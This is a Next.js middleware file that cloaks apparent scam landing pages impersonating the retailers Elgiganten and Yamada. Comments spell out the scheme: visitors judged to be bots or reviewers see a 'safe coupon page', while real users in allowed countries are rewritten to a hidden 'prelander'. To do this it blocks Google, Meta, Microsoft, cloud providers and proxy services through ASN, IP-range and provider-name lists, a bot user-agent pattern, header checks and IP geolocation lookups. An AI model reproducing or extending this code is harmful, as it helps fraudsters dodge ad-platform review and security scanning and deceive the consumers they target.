// middleware.ts
import { NextResponse, NextRequest } from "next/server";

export const config = {
  matcher: ["/elgiganten/verify/:path*", "/yamada", "/yamada/verify/:path*", "/yamada/lander/:path*"],
};

/* ========= RUNTIME CONFIG / LOGGING ========= */
function getRedirectUrl(pathname: string): string {
  if (pathname.startsWith("/yamada")) return "/yamada";
  return "https://www.elgiganten.se";
}
const VERBOSE = process.env.MW_VERBOSE_LOGS !== "0";
const log = (...args: any[]) => VERBOSE && console.log("[MW]", ...args);

/* ========= Provider blocklists (ASN + name/domain snippets) ========= */
const BAD_ASN = new Set<string>([
  // Google
  "AS15169", "AS396982",
  // Cloudflare
  "AS13335",
  // Amazon / AWS
  "AS16509", "AS14618", "AS7224", "AS8987",
  // Microsoft / Azure / Bing
  "AS8075", "AS8068", "AS8069", "AS12076",
  // Meta / Facebook
  "AS32934", "AS54115", "AS34825", "AS149642",
  // Fastly
  "AS54113",
  // Akamai
  "AS20940", "AS16625", "AS16702", "AS35994", "AS32787", "AS63949",
  // TikTok / ByteDance
  "AS396986", "AS138699", "AS132203",
  // Oracle Cloud
  "AS31898", "AS20473",
  // DigitalOcean
  "AS14061",
  // Hetzner
  "AS24940",
  // OVH
  "AS16276",
  // Alibaba Cloud
  "AS45102", "AS37963", "AS45104",
  // Tencent Cloud
  "AS132203", "AS45090", "AS134761",
  // Extras
  "AS36040", "AS19527", "AS139070", "AS36561", "AS43515", "AS16550",
  "AS63293", "AS13443", "AS14413", "AS40793",
  "AS19047", "AS36263", "AS12222",
  "AS13949", "AS22859", "AS36492", "AS394089", "AS40873", "AS139190",
  // Linode / Contabo / Leaseweb / CDN77 / M247 / Proxies / GoDaddy
  "AS32613", "AS51167", "AS59253", "AS30633", "AS60068", "AS9009",
  "AS396507", "AS209103", "AS208091", "AS62563",
  // China Telecom/Unicom/Mobile
  "AS4134", "AS4837", "AS9808", "AS17816", "AS17974",
]);

const BAD_NAME_SNIPPETS: string[] = [
  "google", "google llc", "google cloud", "google ireland limited", "googleusercontent.com",
  "1e100.net", "gvt1.com", "google.com", "youtube", "ggc", "googlebot",
  "meta", "meta platforms", "facebook", "facebook inc", "fb.com", "instagram", "whatsapp",
  "oculus", "threads", "facebook.com", "instagram.com", "meta.com",
  "microsoft", "microsoft corporation", "azure", "windows.net", "bing", "msn",
  "linkedin", "linkedin corporation", "microsoft.com", "azure.com", "linkedin.com",
  "amazon", "amazon technologies", "amazon web services", "aws", "amazonaws.com", "cloudfront.net",
  "cloudflare", "cloudflare, inc", "cloudflare.com",
  "akamai", "akamai technologies", "akamai international", "akamaiedge.net",
  "akamaitechnologies.com", "akamai.com", "prolexic",
  "fastly", "fastly, inc", "fastly.com", "fastly.net",
  "linode", "linode, llc", "linode.com",
  "tiktok", "bytedance", "bytecdn", "byteoversea",
  "digitalocean", "do-user", "digital ocean",
  "hetzner", "hetzner online",
  "ovh", "ovh sas", "ovhcloud",
  "oracle", "oracle cloud", "oracle corporation",
  "alibaba", "aliyun", "alibaba cloud",
  "tencent", "tencent cloud", "qcloud",
  "datacamp", "dataprovider", "m247", "choopa", "quadranet", "leaseweb",
  "colo", "contabo", "vultr", "stackpath", "zenlayer",
  "bright data", "luminati", "brightdata", "luminati networks",
  "oxylabs", "smartproxy", "cdn77",
  // ISP extras
  "triple t broadband public company limited", "triple t broadband", "3bb",
];

/* ======= ENV-driven extensions ======= */
if (process.env.BLOCKED_ASNS) {
  for (const asn of process.env.BLOCKED_ASNS.split(",")) {
    const v = asn.trim().toUpperCase();
    if (v) BAD_ASN.add(v);
  }
}
if (process.env.BLOCKED_ISP_SUBSTRS) {
  for (const s of process.env.BLOCKED_ISP_SUBSTRS.split(",")) {
    const v = s.trim().toLowerCase();
    if (v) BAD_NAME_SNIPPETS.push(v);
  }
}

/** Country rules */
const ALLOWED_COUNTRIES = new Set(
  (process.env.ALLOWED_COUNTRIES || process.env.ALLOWED_COUNTRY || "")
    .split(",")
    .map((c) => c.trim().toUpperCase())
    .filter(Boolean)
);

const BAD_COUNTRIES = new Set<string>(
  (process.env.BLOCKED_COUNTRY_CODES || "")
    .split(",")
    .map((c) => c.trim().toUpperCase())
    .filter(Boolean)
);

function isBlockedByCountry(arg: { code?: string; name?: string }) {
  const code = (arg.code || "").toUpperCase();
  const name = (arg.name || "").toUpperCase();

  if (ALLOWED_COUNTRIES.size > 0) {
    const fallback =
      name === "SWEDEN" ? "SE" :
      name === "ROMANIA" ? "RO" :
      name === "JAPAN" ? "JP" :
      name === "THAILAND" ? "TH" :
      "";
    const effective = code || fallback;
    if (!effective) return true;
    return !ALLOWED_COUNTRIES.has(effective);
  }

  const candidate = code || name;
  return candidate ? BAD_COUNTRIES.has(candidate) : false;
}

/* ========= Bot UA detection ========= */
const BOT_UA =
  /(bot|tencent|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;

/* ========= CIDR check (ported from guard.php) ========= */
const BAD_CIDR = [
  "8.8.8.0/24", "8.8.4.0/24",
  "142.250.0.0/15", "172.217.0.0/16",
  "74.125.0.0/16", "66.249.64.0/19", "64.233.160.0/19",
  "31.13.24.0/21", "31.13.64.0/18",
  "66.220.144.0/20", "69.63.176.0/20", "69.171.224.0/19",
  "157.240.0.0/17", "173.252.64.0/18", "204.15.20.0/22", "103.4.96.0/22",
  "54.80.0.0/12", "52.0.0.0/11",
  "206.130.0.0/16", "192.243.60.0/22",
  "66.135.0.0/16", "199.16.156.0/22",
  "34.64.0.0/10", "34.128.0.0/10",
  "35.184.0.0/13", "35.192.0.0/11", "35.224.0.0/12", "35.240.0.0/13",
  "104.196.0.0/14",
];

function ipToLong(ip: string): number {
  const parts = ip.split(".").map(Number);
  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
}

function isBlockedCidr(ip: string): boolean {
  const ipLong = ipToLong(ip);
  for (const cidr of BAD_CIDR) {
    const [subnet, bitsStr] = cidr.split("/");
    const bits = parseInt(bitsStr);
    const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
    if ((ipToLong(subnet) & mask) === (ipLong & mask)) return true;
  }
  return false;
}

/* ========= Header sanity (ported from guard.php) ========= */
function hasSuspiciousHeaders(req: NextRequest): boolean {
  const ua = req.headers.get("user-agent") || "";
  const acceptLang = req.headers.get("accept-language") || "";
  if (!ua) return true;
  if (!acceptLang || acceptLang.trim().length < 2) return true;
  return false;
}

/* ========= Helpers ========= */
function getClientIp(req: NextRequest): string | null {
  const fwd = req.headers.get("x-forwarded-for");
  if (fwd) {
    const ip = fwd.split(",")[0]?.trim();
    if (ip) return ip;
  }
  const cf = req.headers.get("cf-connecting-ip");
  if (cf) return cf.trim();
  const xr = req.headers.get("x-real-ip");
  if (xr) return xr.trim();
  return null;
}

async function ipinfoLookup(ip: string, token?: string) {
  if (!token) {
    log("No IPINFO_TOKEN; skipping IPinfo.");
    return null;
  }
  const url = `https://api.ipinfo.io/lite/${encodeURIComponent(ip)}?token=${encodeURIComponent(token)}`;
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    log("IPinfo query:", ip);
    const res = await fetch(url, { signal: controller.signal, cache: "no-store" });
    clearTimeout(to);
    if (!res.ok) {
      log("IPinfo non-OK:", res.status, res.statusText);
      return null;
    }
    const json = (await res.json()) as {
      asn?: string;
      as_name?: string;
      as_domain?: string;
      country?: string;
      country_code?: string;
    };
    log("IPinfo response:", json);
    return json;
  } catch (e) {
    clearTimeout(to);
    log("IPinfo error:", e);
    return null;
  }
}

function matchesBadProviderLite(rec: { asn?: string; as_name?: string; as_domain?: string } | null) {
  if (!rec) return false;
  const { asn, as_name, as_domain } = rec;
  if (asn && BAD_ASN.has(asn.toUpperCase())) {
    log("Block by ASN:", asn);
    return true;
  }
  const name = (as_name || "").toLowerCase();
  const domain = (as_domain || "").toLowerCase();
  const hit = BAD_NAME_SNIPPETS.find((n) => name.includes(n) || domain.includes(n));
  if (hit) {
    log(`Block by ISP substring: "${hit}" in name="${name}" domain="${domain}"`);
    return true;
  }
  return false;
}

async function maxmindLookup(req: NextRequest, ip: string) {
  const controller = new AbortController();
  const to = setTimeout(() => controller.abort(), 1200);
  try {
    const url = new URL("/api/isp-lookup", req.nextUrl.origin);
    url.searchParams.set("ip", ip);
    log("MaxMind check:", url.toString());
    const res = await fetch(url.toString(), {
      method: "GET",
      signal: controller.signal,
      headers: { "x-mw": "1" },
      cache: "no-store",
    });
    clearTimeout(to);
    if (!res.ok) {
      log("MaxMind non-OK:", res.status);
      return null;
    }
    const json = (await res.json()) as { isBad?: boolean; reason?: string; isp?: string; asn?: string };
    log("MaxMind response:", json);
    return json;
  } catch (e) {
    clearTimeout(to);
    log("MaxMind error:", e);
    return null;
  }
}

/* ========= Guard: full check (returns true if visitor should be BLOCKED) ========= */
async function isBlocked(req: NextRequest, ip: string | null): Promise<boolean> {
  const ua = req.headers.get("user-agent") || "";

  // 1. Bot UA
  if (BOT_UA.test(ua)) {
    log("Guard: block by bot UA");
    return true;
  }

  // 2. Header sanity (missing UA or Accept-Language)
  if (hasSuspiciousHeaders(req)) {
    log("Guard: block by suspicious headers");
    return true;
  }

  if (!ip) {
    log("Guard: block — no IP");
    return true;
  }

  // 3. CIDR block (Google, Meta, AWS, etc.)
  if (isBlockedCidr(ip)) {
    log("Guard: block by CIDR:", ip);
    return true;
  }

  // 4. IPinfo checks
  const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);

  // 5. Provider / ASN
  if (matchesBadProviderLite(lite)) {
    log("Guard: block by provider");
    return true;
  }

  // 6. Country
  if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
    log("Guard: block by country");
    return true;
  }
  if (ALLOWED_COUNTRIES.size > 0 && (!lite || (!(lite as any).country_code && !lite.country))) {
    log("Guard: block — no country while allow-only active");
    return true;
  }

  // 7. MaxMind secondary
  const mm = await maxmindLookup(req, ip);
  if (mm?.isBad) {
    log("Guard: block by MaxMind");
    return true;
  }

  return false;
}

/* ========= Middleware ========= */
export async function middleware(req: NextRequest) {
  const pathname = req.nextUrl.pathname;
  const ua = req.headers.get("user-agent") || "";
  const ip = getClientIp(req);
  log("— MW START —", { path: pathname, ip, ua });

  // ──────────────────────────────────────────────────────────────────────
  // /yamada (exact) — CLOAKING: guard decides which page to show
  //   blocked (bot/reviewer) → NextResponse.next() → page.tsx (safe coupon page)
  //   real user              → rewrite to /yamada/lander/ → index2.html (prelander)
  //   URL always stays discountnation.online/yamada
  // ──────────────────────────────────────────────────────────────────────
  if (pathname === "/yamada" || pathname === "/yamada/") {
    const blocked = await isBlocked(req, ip);
    if (blocked) {
      log("Guard → show safe page (page.tsx)");
      return NextResponse.next();
    }
    log("Guard → show prelander (rewrite to /yamada/lander/)");
    return NextResponse.rewrite(new URL("/yamada/lander/", req.url));
  }

  // ──────────────────────────────────────────────────────────────────────
  // /yamada/verify/* and /yamada/lander/* — block bots, let real users through
  // ──────────────────────────────────────────────────────────────────────
  if (pathname.startsWith("/yamada/verify") || pathname.startsWith("/yamada/lander")) {
    const REDIRECT_URL = "/yamada";

    if (BOT_UA.test(ua)) {
      log("Block bot on sub-route →", REDIRECT_URL);
      return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
    }

    if (ip) {
      const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);

      if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
        log("Block by country on sub-route");
        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
      }
      if (ALLOWED_COUNTRIES.size > 0 && (!lite || (!(lite as any).country_code && !lite.country))) {
        log("Block by missing country on sub-route");
        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
      }
      if (matchesBadProviderLite(lite)) {
        log("Block by provider on sub-route");
        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
      }

      const mm = await maxmindLookup(req, ip);
      if (mm?.isBad) {
        log("Block by MaxMind on sub-route");
        return NextResponse.redirect(new URL(REDIRECT_URL, req.url), { status: 302 });
      }
    }

    log("Allow through sub-route");
    return NextResponse.next();
  }

  // ──────────────────────────────────────────────────────────────────────
  // /elgiganten/verify/* — existing logic (unchanged)
  // ──────────────────────────────────────────────────────────────────────
  const REDIRECT_URL = getRedirectUrl(pathname);

  if (BOT_UA.test(ua)) {
    log("Block by UA bot signature");
    return NextResponse.redirect(REDIRECT_URL, { status: 302 });
  }

  if (ip) {
    const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);

    if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
      log("Block by country:", { code: (lite as any).country_code, name: lite.country });
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }
    if (ALLOWED_COUNTRIES.size > 0 && (!lite || (!(lite as any).country_code && !lite.country))) {
      log("Block by country: missing code while allow-only active");
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }

    if (matchesBadProviderLite(lite)) {
      log("Redirect (IPinfo match) →", REDIRECT_URL);
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }

    const mm = await maxmindLookup(req, ip);
    if (mm?.isBad) {
      log("Redirect (MaxMind match) →", REDIRECT_URL);
      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
    }
  }

  log("Allow through");
  return NextResponse.next();
}
